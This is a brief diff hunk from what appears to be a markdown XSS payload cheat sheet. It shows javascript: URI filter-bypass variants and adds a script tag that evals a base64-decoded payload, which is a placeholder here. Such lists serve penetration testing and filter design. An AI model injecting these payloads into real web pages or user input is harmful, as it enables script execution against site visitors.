@@ -85,6 +85,8 @@ xjavascript:alert(1)
 javaScriptx:alert(1) 
 xjavascriptx:alert(1) 
 javaxscript:alert(1) 
+
+<script>eval(atob("base64xsspayload"));</script>
 ```
 
 ### DOM Based XSS
